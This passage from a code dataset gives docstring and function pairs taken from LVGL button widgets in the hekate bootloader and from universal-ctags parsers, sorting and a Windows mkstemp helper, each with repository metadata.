< ext->btn_cnt) ext->btn_id_pr = area_below;\n            }\n            lv_obj_invalidate(btnm);\n        } else if(c == LV_GROUP_KEY_UP) {\n            lv_style_t * style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BG);\n            /*Find the area below the the current*/\n            if(ext->btn_id_pr  == LV_BTNM_PR_NONE) {\n                ext->btn_id_pr = 0;\n            } else {\n                int16_t area_above;\n                lv_coord_t pr_center = ext->button_areas[ext->btn_id_pr].x1 + (lv_area_get_width(&ext->button_areas[ext->btn_id_pr]) >> 1);\n\n                for(area_above = ext->btn_id_pr; area_above >= 0; area_above --) {\n                    if(ext->button_areas[area_above].y1 < ext->button_areas[ext->btn_id_pr].y1 &&\n                            pr_center >=  ext->button_areas[area_above].x1 - style->body.padding.hor &&\n                            pr_center <=  ext->button_areas[area_above].x2) {\n                        break;\n                    }\n                }\n                if(area_above >= 0) ext->btn_id_pr = area_above;\n\n            }\n            lv_obj_invalidate(btnm);\n        } else if(c == LV_GROUP_KEY_ENTER) {\n            if(ext->action != NULL) {\n                uint16_t txt_i = get_button_text(btnm, ext->btn_id_pr);\n                if(txt_i != LV_BTNM_PR_NONE) {\n                    res = ext->action(btnm, cut_ctrl_byte(ext->map_p[txt_i]));\n                }\n            }\n        }\n    } else if(sign == LV_SIGNAL_GET_EDITABLE) {\n        bool * editable = (bool *)param;\n        *editable = true;\n    } else if(sign == LV_SIGNAL_GET_TYPE) {\n        lv_obj_type_t * buf = param;\n        uint8_t i;\n        for(i = 0; i < LV_MAX_ANCESTOR_NUM - 1; i++) {  /*Find the last set data*/\n            if(buf->type[i] == NULL) break;\n        }\n        buf->type[i] = \"lv_btnm\";\n    }\n\n\n    return res;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get time of the ink in effect (draw a circle on click to animate in the new state)\n * @param btn pointer to a button object\n * @return the time of the ink animation\n */\n", "func_signal": "uint16_t lv_btn_get_ink_in_time(const lv_obj_t * btn)", "code": "{\n#if USE_LV_ANIMATION && LV_BTN_INK_EFFECT\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n    return ext->ink_in_time;\n#else\n    (void)btn; /*Unused*/\n    return 0;\n#endif\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Toggle the state of the button (ON->OFF, OFF->ON)\n * @param btn pointer to a button object\n */\n", "func_signal": "void lv_btn_toggle(lv_obj_t * btn)", "code": "{\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n    switch(ext->state) {\n        case LV_BTN_STATE_REL:\n            lv_btn_set_state(btn, LV_BTN_STATE_TGL_REL);\n            break;\n        case LV_BTN_STATE_PR:\n            lv_btn_set_state(btn, LV_BTN_STATE_TGL_PR);\n            break;\n        case LV_BTN_STATE_TGL_REL:\n            lv_btn_set_state(btn, LV_BTN_STATE_REL);\n            break;\n        case LV_BTN_STATE_TGL_PR:\n            lv_btn_set_state(btn, LV_BTN_STATE_PR);\n            break;\n        default:\n            break;\n    }\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Set time of the ink out effect (animate to the released state)\n * @param btn pointer to a button object\n * @param time the time of the ink animation\n */\n", "func_signal": "void lv_btn_set_ink_out_time(lv_obj_t * btn, uint16_t time)", "code": "{\n#if USE_LV_ANIMATION && LV_BTN_INK_EFFECT\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n    ext->ink_out_time = time;\n#else\n    (void)btn; /*Unused*/\n    (void)time; /*Unused*/\n    LV_LOG_WARN(\"`lv_btn_set_ink_out_time` has no effect if LV_BTN_INK_EFEFCT or USE_LV_ANIMATION is disabled\")\n#endif\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get the width of a button in units. It comes from the first \"letter\".\n * @param btn_str The descriptor string of a button. E.g. \"apple\" or \"\\004banana\"\n * @return the width of the button in units\n */\n", "func_signal": "static uint8_t get_button_width(const char * btn_str)", "code": "{\n    if((btn_str[0] & LV_BTNM_CTRL_MASK) == LV_BTNM_CTRL_CODE) {\n        return btn_str[0] & LV_BTNM_WIDTH_MASK;\n    }\n\n    return 1;   /*Default width is 1*/\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get the wait time before the ink disappears\n * @param btn pointer to a button object\n * @return the time of the ink animation\n */\n", "func_signal": "uint16_t lv_btn_get_ink_wait_time(const lv_obj_t * btn)", "code": "{\n#if USE_LV_ANIMATION && LV_BTN_INK_EFFECT\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n    return ext->ink_wait_time;\n#else\n    (void)btn; /*Unused*/\n    return 0;\n#endif\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Called to clean up when the ink animation is ready\n * @param p unused\n */\n", "func_signal": "static void lv_btn_ink_effect_anim_ready(void * p)", "code": "{\n    (void) p;    /*Unused*/\n\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(ink_obj);\n    lv_btn_state_t state = lv_btn_get_state(ink_obj);\n\n    lv_obj_invalidate(ink_obj);\n    ink_ready = true;\n\n    if((state == LV_BTN_STATE_REL || state == LV_BTN_STATE_TGL_REL) && ext->toggle == 0 && ink_playback == false) {\n        lv_anim_t a;\n        a.var = ink_obj;\n        a.start = LV_BTN_INK_VALUE_MAX;\n        a.end = 0;\n        a.fp = (lv_anim_fp_t)lv_btn_ink_effect_anim;\n        a.path = lv_anim_path_linear;\n        a.end_cb = lv_btn_ink_effect_anim_ready;\n        a.act_time = -ext->ink_wait_time;\n        a.time = ext->ink_out_time;\n        a.playback = 0;\n        a.playback_pause = 0;\n        a.repeat = 0;\n        a.repeat_pause = 0;\n        lv_anim_create(&a);\n\n        ink_playback = true;\n    } else {\n        ink_obj = NULL;\n    }\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get the current map of a button matrix\n * @param btnm pointer to a button matrix object\n * @return the current map\n */\n", "func_signal": "const char ** lv_btnm_get_map(const lv_obj_t * btnm)", "code": "{\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    return ext->map_p;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get a the callback function of the buttons on a button matrix\n * @param btnm: pointer to button matrix object\n * @return pointer to the callback function\n */\n", "func_signal": "lv_btnm_action_t lv_btnm_get_action(const lv_obj_t * btnm)", "code": "{\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    return ext->action;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Gives the button id of a button under a given point\n * @param btnm pointer to a button matrix object\n * @param p a point with absolute coordinates\n * @return the id of the button or LV_BTNM_PR_NONE.\n */\n", "func_signal": "static uint16_t get_button_from_point(lv_obj_t * btnm, lv_point_t * p)", "code": "{\n    lv_area_t btnm_cords;\n    lv_area_t btn_area;\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    uint16_t i;\n    lv_obj_get_coords(btnm, &btnm_cords);\n\n    for(i = 0; i < ext->btn_cnt; i++) {\n        lv_area_copy(&btn_area, &ext->button_areas[i]);\n        btn_area.x1 += btnm_cords.x1;\n        btn_area.y1 += btnm_cords.y1;\n        btn_area.x2 += btnm_cords.x1;\n        btn_area.y2 += btnm_cords.y1;\n        if(lv_area_is_point_on(&btn_area, p) != false) {\n            break;\n        }\n    }\n\n    if(i == ext->btn_cnt) i = LV_BTNM_PR_NONE;\n\n    return i;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get a style of a button matrix\n * @param btnm pointer to a button matrix object\n * @param type which style should be get\n * @return style pointer to a style\n */\n", "func_signal": "lv_style_t * lv_btnm_get_style(const lv_obj_t * btnm, lv_btnm_style_t type)", "code": "{\n    lv_style_t * style = NULL;\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n\n    switch(type) {\n        case LV_BTNM_STYLE_BG:\n            style = lv_obj_get_style(btnm);\n            break;\n        case LV_BTNM_STYLE_BTN_REL:\n            style = ext->styles_btn[LV_BTN_STATE_REL];\n            break;\n        case LV_BTNM_STYLE_BTN_PR:\n            style = ext->styles_btn[LV_BTN_STATE_PR];\n            break;\n        case LV_BTNM_STYLE_BTN_TGL_REL:\n            style = ext->styles_btn[LV_BTN_STATE_TGL_REL];\n            break;\n        case LV_BTNM_STYLE_BTN_TGL_PR:\n            style = ext->styles_btn[LV_BTN_STATE_TGL_PR];\n            break;\n        case LV_BTNM_STYLE_BTN_INA:\n            style = ext->styles_btn[LV_BTN_STATE_INA];\n            break;\n        default:\n            style = NULL;\n            break;\n    }\n\n    return style;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Enable or disable button toggling\n * @param btnm pointer to button matrix object\n * @param en true: enable toggling; false: disable toggling\n * @param id index of the currently toggled button (ignored if 'en' == false)\n */\n", "func_signal": "void lv_btnm_set_toggle(lv_obj_t * btnm, bool en, uint16_t id)", "code": "{\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n\n    ext->toggle = en == false ? 0 : 1;\n    if(ext->toggle != 0) {\n        if(id >= ext->btn_cnt) id = ext->btn_cnt - 1;\n        ext->btn_id_tgl = id;\n    } else {\n        ext->btn_id_tgl = LV_BTNM_PR_NONE;\n    }\n\n    lv_obj_invalidate(btnm);\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Handle the drawing related tasks of the button matrixs\n * @param btnm pointer to a button matrix object\n * @param mask the object will be drawn only in this area\n * @param mode LV_DESIGN_COVER_CHK: only check if the object fully covers the 'mask_p' area\n *                                  (return 'true' if yes)\n *             LV_DESIGN_DRAW: draw the object (always return 'true')\n *             LV_DESIGN_DRAW_POST: drawing after every children are drawn\n * @param return true/false, depends on 'mode'\n */\n", "func_signal": "static bool lv_btnm_design(lv_obj_t * btnm, const lv_area_t * mask, lv_design_mode_t mode)", "code": "{\n    if(mode == LV_DESIGN_COVER_CHK) {\n        return ancestor_design_f(btnm, mask, mode);\n        /*Return false if the object is not covers the mask_p area*/\n    }\n    /*Draw the object*/\n    else if(mode == LV_DESIGN_DRAW_MAIN) {\n\n        ancestor_design_f(btnm, mask, mode);\n\n        lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n        lv_style_t * bg_style = lv_obj_get_style(btnm);\n        lv_style_t * btn_style;\n        lv_opa_t opa_scale = lv_obj_get_opa_scale(btnm);\n\n        lv_area_t area_btnm;\n        lv_obj_get_coords(btnm, &area_btnm);\n\n        lv_area_t area_tmp;\n        lv_coord_t btn_w;\n        lv_coord_t btn_h;\n\n        uint16_t btn_i = 0;\n        uint16_t txt_i = 0;\n        lv_style_t style_tmp;\n        lv_txt_flag_t txt_flag = LV_TXT_FLAG_NONE;\n\n        if(ext->recolor) txt_flag = LV_TXT_FLAG_RECOLOR;\n\n        for(btn_i = 0; btn_i < ext->btn_cnt; btn_i ++, txt_i ++) {\n            /*Search the next valid text in the map*/\n            while(strcmp(ext->map_p[txt_i], \"\\n\") == 0) {\n                txt_i ++;\n            }\n\n            /*Skip hidden buttons*/\n            if(button_is_hidden(ext->map_p[txt_i])) continue;\n\n            lv_area_copy(&area_tmp, &ext->button_areas[btn_i]);\n            area_tmp.x1 += area_btnm.x1;\n            area_tmp.y1 += area_btnm.y1;\n            area_tmp.x2 += area_btnm.x1;\n            area_tmp.y2 += area_btnm.y1;\n\n            btn_w = lv_area_get_width(&area_tmp);\n            btn_h = lv_area_get_height(&area_tmp);\n\n            /*Load the style*/\n            if(button_is_inactive(ext->map_p[txt_i])) btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_INA);\n            else if(btn_i != ext->btn_id_pr && btn_i != ext->btn_id_tgl) btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_REL);\n            else if(btn_i == ext->btn_id_pr && btn_i != ext->btn_id_tgl) btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_PR);\n            else if(btn_i != ext->btn_id_pr && btn_i == ext->btn_id_tgl) btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_TGL_REL);\n            else if(btn_i == ext->btn_id_pr && btn_i == ext->btn_id_tgl) btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_TGL_PR);\n            else btn_style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BTN_REL);    /*Not possible option, just to be sure*/\n\n            lv_style_copy(&style_tmp, btn_style);\n\n            /*Remove borders on the edges if `LV_BORDER_INTERNAL`*/\n            if(style_tmp.body.border.part & LV_BORDER_INTERNAL) {\n                if(area_tmp.y1 == btnm->coords.y1 + bg_style->body.padding.ver) {\n                    style_tmp.body.border.part &= ~LV_BORDER_TOP;\n                }\n                if(area_tmp.y2 == btnm->coords.y2 - bg_style->body.padding.ver) {\n                    style_tmp.body.border.part &= ~LV_BORDER_BOTTOM;\n                }\n\n                if(txt_i == 0) {\n                    style_tmp.body.border.part &= ~LV_BORDER_LEFT;\n                }\n                else if(strcmp(ext->map_p[txt_i - 1],\"\\n\") == 0) {\n                    style_tmp.body.border.part &= ~LV_BORDER_LEFT;\n                }\n\n                if(ext->map_p[txt_i + 1][0] == '\\0' || strcmp(ext->map_p[txt_i + 1], \"\\n\") == 0) {\n                        style_tmp.body.border.part &= ~LV_BORDER_RIGHT;\n                }\n            }\n            lv_draw_rect(&area_tmp, mask, &style_tmp, opa_scale);\n\n            /*Calculate the size of the text*/\n            if(btn_style->glass) btn_style = bg_style;\n            const lv_font_t * font = btn_style->text.font;\n            lv_point_t txt_size;\n            lv_txt_get_size(&txt_size, ext->map_p[txt_i], font,\n                            btn_style->text.letter_space, btn_style->text.line_space,\n                            lv_area_get_width(&area_btnm), txt_flag);\n\n            area_tmp.x1 += (btn_w - txt_size.x) / 2;\n            area_tmp.y1 += (btn_h - txt_size.y) / 2;\n            area_tmp.x2 = area_tmp.x1 + txt_size.x;\n            area_tmp.y2 = area_tmp.y1 + txt_size.y;\n\n            lv_draw_label(&area_tmp, mask, btn_style, opa_scale,  ext->map_p[txt_i], txt_flag, NULL);\n        }\n    }\n    return true;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Set a style of a button matrix\n * @param btnm pointer to a button matrix object\n * @param type which style should be set\n * @param style pointer to a style\n */\n", "func_signal": "void lv_btnm_set_style(lv_obj_t * btnm, lv_btnm_style_t type, lv_style_t * style)", "code": "{\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n\n    switch(type) {\n        case LV_BTNM_STYLE_BG:\n            lv_obj_set_style(btnm, style);\n            break;\n        case LV_BTNM_STYLE_BTN_REL:\n            ext->styles_btn[LV_BTN_STATE_REL] = style;\n            lv_obj_invalidate(btnm);\n            break;\n        case LV_BTNM_STYLE_BTN_PR:\n            ext->styles_btn[LV_BTN_STATE_PR] = style;\n            lv_obj_invalidate(btnm);\n            break;\n        case LV_BTNM_STYLE_BTN_TGL_REL:\n            ext->styles_btn[LV_BTN_STATE_TGL_REL] = style;\n            lv_obj_invalidate(btnm);\n            break;\n        case LV_BTNM_STYLE_BTN_TGL_PR:\n            ext->styles_btn[LV_BTN_STATE_TGL_PR] = style;\n            lv_obj_invalidate(btnm);\n            break;\n        case LV_BTNM_STYLE_BTN_INA:\n            ext->styles_btn[LV_BTN_STATE_INA] = style;\n            lv_obj_invalidate(btnm);\n            break;\n    }\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Handle the drawing related tasks of the drop down lists\n * @param btn pointer to an object\n * @param mask the object will be drawn only in this area\n * @param mode LV_DESIGN_COVER_CHK: only check if the object fully covers the 'mask_p' area\n *                                  (return 'true' if yes)\n *             LV_DESIGN_DRAW: draw the object (always return 'true')\n *             LV_DESIGN_DRAW_POST: drawing after every children are drawn\n * @param return true/false, depends on 'mode'\n */\n", "func_signal": "static bool lv_btn_design(lv_obj_t * btn, const lv_area_t * mask, lv_design_mode_t mode)", "code": "{\n    if(mode == LV_DESIGN_COVER_CHK) {\n        return false;\n    } else if(mode == LV_DESIGN_DRAW_MAIN) {\n\n#if USE_LV_ANIMATION && LV_BTN_INK_EFFECT\n        if(btn != ink_obj) {\n            ancestor_design(btn, mask, mode);\n        } else {\n            lv_opa_t opa_scale = lv_obj_get_opa_scale(btn);\n            lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n\n            /*Draw the normal button*/\n            if(ink_playback == false) {\n                lv_style_t style_tmp;\n                lv_style_copy(&style_tmp, ext->styles[ink_bg_state]);\n                style_tmp.body.shadow.width = ext->styles[ink_top_state]->body.shadow.width;\n                lv_draw_rect(&btn->coords, mask, &style_tmp, opa_scale);\n\n                lv_coord_t w = lv_obj_get_width(btn);\n                lv_coord_t h = lv_obj_get_height(btn);\n                lv_coord_t r_max = LV_MATH_MIN(w, h) / 2;\n\n                /*In the first part of the animation increase the size of the circle (ink effect) */\n                lv_area_t cir_area;\n\n                lv_coord_t coord_state = ink_act_value < LV_BTN_INK_VALUE_MAX / 2 ? ink_act_value : LV_BTN_INK_VALUE_MAX / 2;\n                lv_point_t p_act;\n                p_act.x = ink_point.x;\n                p_act.y = ink_point.y;\n                lv_coord_t x_err = (btn->coords.x1 + w / 2) - p_act.x;\n                lv_coord_t y_err = (btn->coords.y1 + h / 2) - p_act.y;\n\n                p_act.x += (x_err * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1);\n                p_act.y += (y_err * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1);\n\n                lv_coord_t half_side = LV_MATH_MAX(w, h) / 2;\n                cir_area.x1 = p_act.x - ((half_side * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1));\n                cir_area.y1 = p_act.y - ((half_side * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1));\n                cir_area.x2 = p_act.x + ((half_side * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1));\n                cir_area.y2 = p_act.y + ((half_side * coord_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1));\n\n                lv_area_intersect(&cir_area, &btn->coords, &cir_area);      /*Limit the area. (It might be too big on the smaller side)*/\n\n                /*In the second part animate the radius. Circle -> body.radius*/\n                lv_coord_t r_state = ink_act_value > LV_BTN_INK_VALUE_MAX / 2 ? ink_act_value - LV_BTN_INK_VALUE_MAX / 2 : 0;\n\n                lv_style_copy(&style_tmp, ext->styles[ink_top_state]);\n                style_tmp.body.radius = r_max + (((ext->styles[ink_bg_state]->body.radius - r_max) * r_state) >> (LV_BTN_INK_VALUE_MAX_SHIFT - 1));\n                style_tmp.body.border.width = 0;\n\n                /*Draw the circle*/\n                lv_draw_rect(&cir_area, mask, &style_tmp, opa_scale);\n            } else {\n                lv_style_t res;\n                lv_style_copy(&res, ext->styles[ink_bg_state]);\n                lv_style_mix(ext->styles[ink_bg_state], ext->styles[ink_top_state], &res, ink_act_value);\n                lv_draw_rect(&btn->coords, mask, &res, opa_scale);\n\n            }\n        }\n#else\n        ancestor_design(btn, mask, mode);\n#endif\n    } else if(mode == LV_DESIGN_DRAW_POST) {\n        ancestor_design(btn, mask, mode);\n    }\n\n    return true;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/*\n * lisp tag functions\n *  look for (def or (DEF, quote or QUOTE\n */\n", "func_signal": "static int L_isdef (const unsigned char *strp, bool case_insensitive)", "code": "{\n\tbool cis = case_insensitive; /* Renaming for making code short */\n\n\treturn ( (strp [1] == 'd' || (cis && strp [1] == 'D'))\n\t\t  && (strp [2] == 'e' || (cis && strp [2] == 'E'))\n\t\t  && (strp [3] == 'f' || (cis && strp [3] == 'F')));\n}", "path": "ctags/parsers/lisp.c", "commit_date": "2020-02-19 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n    The mkstemp() function generates a unique temporary filename from template,\n    creates and opens the file, and returns an open file descriptor for the\n    file.\n\n    The template may be any file name with at least six trailing Xs, for example\n    /tmp/temp.XXXXXXXX. The trailing Xs are replaced with a unique digit and\n    letter combination that makes the file name unique. Since it will be\n    modified, template must not be a string constant, but should be declared as\n    a character array.\n\n    The file is created with permissions 0600, that is, read plus write for\n    owner only. The returned file descriptor provides both read and write access\n    to the file.\n */\n", "func_signal": "int __cdecl mkstemp (char *template_name)", "code": "{\n    int i, j, fd, len, index;\n\n    /* These are the (62) characters used in temporary filenames. */\n    static const char letters[] = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n\n    /* The last six characters of template must be \"XXXXXX\" */\n    if (template_name == NULL || (len = strlen (template_name)) < 6\n            || memcmp (template_name + (len - 6), \"XXXXXX\", 6)) {\n        errno = EINVAL;\n        return -1;\n    }\n\n    /* User may supply more than six trailing Xs */\n    for (index = len - 6; index > 0 && template_name[index - 1] == 'X'; index--);\n\n    /*\n        Like OpenBSD, mkstemp() will try at least 2 ** 31 combinations before\n        giving up.\n     */\n    for (i = 0; i >= 0; i++) {\n        for(j = index; j < len; j++) {\n            template_name[j] = letters[rand () % 62];\n        }\n        fd = _sopen(template_name,\n                _O_RDWR | _O_CREAT | _O_EXCL | _O_BINARY,\n                _SH_DENYRW, _S_IREAD | _S_IWRITE);\n        if (fd != -1) return fd;\n        if (fd == -1 && errno != EEXIST) return -1;\n    }\n\n    return -1;\n}", "path": "ctags/win32/mkstemp/mkstemp.c", "commit_date": "2017-05-19 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n *  These functions provide a basic internal sort. No great memory\n *  optimization is performed (e.g. recursive subdivided sorts),\n *  so have lots of memory if you have large tag files.\n */\n", "func_signal": "extern void failedSort (MIO *const mio, const char* msg)", "code": "{\n\tconst char* const cannotSort = \"cannot sort tag file\";\n\tif (mio != NULL)\n\t\tmio_unref (mio);\n\tif (msg == NULL)\n\t\terror (FATAL | PERROR, \"%s\", cannotSort);\n\telse\n\t\terror (FATAL, \"%s: %s\", msg, cannotSort);\n}", "path": "ctags/main/sort.c", "commit_date": "2019-10-31 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n*   FUNCTION DEFINITIONS\n*/\n", "func_signal": "extern parserDefinition* RexxParser (void)", "code": "{\n\tstatic const char *const extensions [] = { \"cmd\", \"rexx\", \"rx\", NULL };\n\tparserDefinition* const def = parserNew (\"REXX\");\n\tstatic selectLanguage selectors[] = { selectByRexxCommentAndDosbatchLabelPrefix,\n\t\t\t\t\t      NULL };\n\tdef->extensions = extensions;\n\tdef->tagRegexTable = rexxTagRegexTable;\n\tdef->tagRegexCount = ARRAY_SIZE (rexxTagRegexTable);\n\tdef->method     = METHOD_NOT_CRAFTED|METHOD_REGEX;\n\tdef->selectLanguage = selectors;\n\treturn def;\n}", "path": "ctags/parsers/rexx.c", "commit_date": "2016-08-11 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n*   FUNCTION DEFINITIONS\n*/\n", "func_signal": "static void findAwkTags (void)", "code": "{\n\tvString *name = vStringNew ();\n\tconst unsigned char *line;\n\n\twhile ((line = readLineFromInputFile ()) != NULL)\n\t{\n\t\tif (strncmp ((const char*) line, \"function\", (size_t) 8) == 0  &&\n\t\t\tisspace ((int) line [8]))\n\t\t{\n\t\t\tconst unsigned char *cp = line + 8;\n\n\t\t\twhile (isspace ((int) *cp))\n\t\t\t\t++cp;\n\t\t\twhile (isalnum ((int) *cp)  ||  *cp == '_')\n\t\t\t{\n\t\t\t\tvStringPut (name, (int) *cp);\n\t\t\t\t++cp;\n\t\t\t}\n\t\t\twhile (isspace ((int) *cp))\n\t\t\t\t++cp;\n\t\t\tif (*cp == '(')\n\t\t\t\tmakeSimpleTag (name, K_FUNCTION);\n\t\t\tvStringClear (name);\n\t\t\tif (*cp != '\\0')\n\t\t\t\t++cp;\n\t\t}\n\t}\n\tvStringDelete (name);\n}", "path": "ctags/parsers/awk.c", "commit_date": "2017-10-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "// This is working code but it's unused and coveralls complains.. sigh.\n// Remove the #if above if needed.\n", "func_signal": "CXXToken * cxxTokenChainFirstKeyword(\n\t\tCXXTokenChain * tc,\n\t\tCXXKeyword eKeyword\n\t)", "code": "{\n\tif(!tc)\n\t\treturn NULL;\n\tif(tc->iCount < 1)\n\t\treturn NULL;\n\n\tCXXToken * pToken = tc->pHead;\n\twhile(pToken)\n\t{\n\t\tif(cxxTokenIsKeyword(pToken,eKeyword))\n\t\t\treturn pToken;\n\t\tpToken = pToken->pNext;\n\t}\n\n\treturn NULL;\n}", "path": "ctags/parsers/cxx/cxx_token_chain.c", "commit_date": "2020-03-01 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "// currently unused\n", "func_signal": "void cxxTokenChainMoveEntries(CXXTokenChain * src,CXXTokenChain * dest)", "code": "{\n\tif(dest->iCount > 0)\n\t\tcxxTokenChainClear(dest);\n\n\tdest->iCount = src->iCount;\n\tdest->pHead = src->pHead;\n\tdest->pTail = src->pTail;\n\n\tsrc->iCount = 0;\n\tsrc->pHead = NULL;\n\tsrc->pTail = NULL;\n}", "path": "ctags/parsers/cxx/cxx_token_chain.c", "commit_date": "2020-03-01 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
{"docstring": "/*\n *\t Tag generation functions\n */\n", "func_signal": "static void makeBibTag (tokenInfo *const token, bibKind kind)", "code": "{\n\tif (BibKinds [kind].enabled)\n\t{\n\t\tconst char *const name = vStringValue (token->string);\n\t\ttagEntryInfo e;\n\t\tinitTagEntry (&e, name, kind);\n\n\t\te.lineNumber   = token->lineNumber;\n\t\te.filePosition = token->filePosition;\n\n\t\tmakeTagEntry (&e);\n\t}\n}", "path": "ctags/parsers/bibtex.c", "commit_date": "2019-07-15 00:00:00", "repo_name": "universal-ctags/ctags", "stars": 6190, "license": "gpl-2.0", "language": "c", "size": 22127}
